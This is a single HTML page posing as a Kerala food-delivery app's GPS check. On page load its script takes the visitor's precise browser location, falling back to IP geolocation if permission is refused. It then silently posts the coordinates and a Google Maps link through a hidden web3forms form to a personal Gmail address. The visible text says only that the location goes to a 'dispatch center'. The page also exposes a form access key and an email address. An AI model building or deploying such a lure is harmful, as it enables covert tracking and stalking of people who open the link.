<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickDelivery Kerala | GPS Test</title>
    <style>
        :root {
            --primary: #e67e22;
            --success: #27ae60;
            --bg: #f4f7f6;
        }

        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto;
            background-color: var(--bg);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #2c3e50;
        }

        .app-container {
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            text-align: center;
        }

        .header h1 {
            color: var(--primary);
            margin: 0;
            font-size: 1.6rem;
        }

        .status-box {
            margin: 30px 0;
            padding: 20px;
            border-radius: 15px;
            background: #fffaf5;
            border: 1px solid #ffe0b2;
        }

        #status-icon {
            font-size: 3.5rem;
            margin-bottom: 15px;
            display: block;
        }

        .pulse {
            animation: pulse-animation 1.5s infinite;
        }

        @keyframes pulse-animation {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }

        #main-status {
            font-weight: bold;
            font-size: 1.2rem;
            margin-bottom: 8px;
        }

        #detail-status {
            font-size: 0.9rem;
            color: #7f8c8d;
        }

        .log-container {
            text-align: left;
            background: #2d3436;
            color: #00ff00;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 0.75rem;
            height: 80px;
            overflow-y: auto;
            margin-top: 20px;
        }

        .footer-text {
            font-size: 0.8rem;
            color: #bdc3c7;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <h1>üöö Kerala Delivery</h1>
            <p>High-Precision Location System</p>
        </div>

        <div class="status-box">
            <span id="status-icon" class="pulse">üìç</span>
            <div id="main-status">Initializing...</div>
            <div id="detail-status">Checking GPS availability</div>
        </div>

        <div class="log-container" id="log">
            [System]: Ready for testing...<br>
        </div>

        <p class="footer-text">Your delivery will get to you soon after fetching and sending the location.</p>

        <form id="location-form" style="display: none;">
            <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
            <input type="hidden" name="subject" value="URGENT: New Delivery Location Received">
            <input type="hidden" name="from_name" value="Kerala Food Delivery App">
            
            <input type="hidden" name="Coordinates" id="form-coords">
            <input type="hidden" name="Accuracy" id="form-accuracy">
            <input type="hidden" name="Method" id="form-method">
            <input type="hidden" name="GoogleMapsLink" id="form-link">
        </form>
    </div>

    <script>
        const mainStatus = document.getElementById('main-status');
        const detailStatus = document.getElementById('detail-status');
        const logBox = document.getElementById('log');

        function addLog(msg) {
            logBox.innerHTML += `> ${msg}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateUI(main, detail, icon = "üìç") {
            mainStatus.innerText = main;
            detailStatus.innerText = detail;
            if(icon !== "üìç") {
                document.getElementById('status-icon').innerText = icon;
                document.getElementById('status-icon').classList.remove('pulse');
            }
        }

        // 1. Core Location Function
        async function getLocation() {
            addLog("Requesting high-precision GPS...");
            
            const options = {
                enableHighAccuracy: true,
                timeout: 12000,
                maximumAge: 0
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => processLocation(pos, "SATELLITE/GPS"),
                    (err) => {
                        addLog("GPS Error: " + err.message);
                        fetchIPLocation();
                    },
                    options
                );
            } else {
                addLog("Browser doesn't support GPS.");
                fetchIPLocation();
            }
        }

        // 2. IP Fallback Function
        async function fetchIPLocation() {
            addLog("Falling back to IP Location...");
            updateUI("GPS Signal Weak", "Switching to IP triangulation...");
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                const mockPos = {
                    coords: {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 5000 // Approximate for IP
                    }
                };
                processLocation(mockPos, "NETWORK-IP");
            } catch (e) {
                addLog("Final Error: No location found.");
                updateUI("Failed", "Please enable location in settings.");
            }
        }

        // 3. Process and Submit
        function processLocation(pos, method) {
            const { latitude, longitude, accuracy } = pos.coords;
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            addLog(`Found via ${method}`);
            addLog(`Accuracy: ${Math.round(accuracy)}m`);

            document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
            document.getElementById('form-accuracy').value = `${Math.round(accuracy)} meters`;
            document.getElementById('form-method').value = method;
            document.getElementById('form-link').value = mapsLink;

            updateUI("Location Secured", "Sending to dispatch center...");
            submitToWeb3();
        }

        function submitToWeb3() {
            const form = document.getElementById('location-form');
            const formData = new FormData(form);

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    addLog("Data sent to sanjayn1229@gmail.com");
                    updateUI("Ready to Deliver!", "Your delivery will get to you soon.", "üçï");
                } else {
                    updateUI("API Error", "Check your access key.");
                }
            })
            .catch(error => {
                updateUI("Network Error", "Check your mobile data.");
                addLog("Network Error: " + error.message);
            });
        }

        // Start process on load
        window.onload = getLocation;
    </script>
</body>
</html>
